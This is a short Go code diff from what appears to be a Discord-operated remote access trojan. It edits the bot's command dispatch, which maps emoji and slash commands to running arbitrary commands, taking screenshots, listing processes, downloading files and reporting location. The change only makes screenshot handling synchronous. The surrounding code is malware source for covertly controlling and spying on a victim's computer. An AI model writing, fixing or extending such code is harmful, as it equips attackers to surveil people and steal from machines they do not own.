@@ -1578,7 +1578,7 @@ func HandleButtonInteraction(s *discordgo.Session, i *discordgo.InteractionCreat
 		go handleListProcesses(s, i)
 	case "screenshot":
 		fmt.Println("Taking screenshot...")
-		go handleScreenshot(s, i)
+		handleScreenshot(s, i)
 	case "help":
 		fmt.Println("Displaying help...")
 		go helpCommand(s, i.ChannelID)
@@ -1604,7 +1604,7 @@ func Handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	case strings.HasPrefix(m.Content, "🏃‍♂️"):
 		go runCommand(s, m, m.Content[14:])
 	case m.Content == "📸":
-		go handleScreenshot(s, m)
+		handleScreenshot(s, m)
 	case strings.HasPrefix(m.Content, "👇"):
 		go handleFileDownload(s, m)
 	case strings.HasPrefix(m.Content, "☝️"):
@@ -1632,7 +1632,7 @@ func SlashCommandHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	case "help":
 		go helpCommand(s, i.ChannelID)
 	case "screenshot":
-		go handleScreenshot(s, i)
+		handleScreenshot(s, i)
 	case "download":
 		go handleFileDownload(s, i.Interaction)
 	case "location":
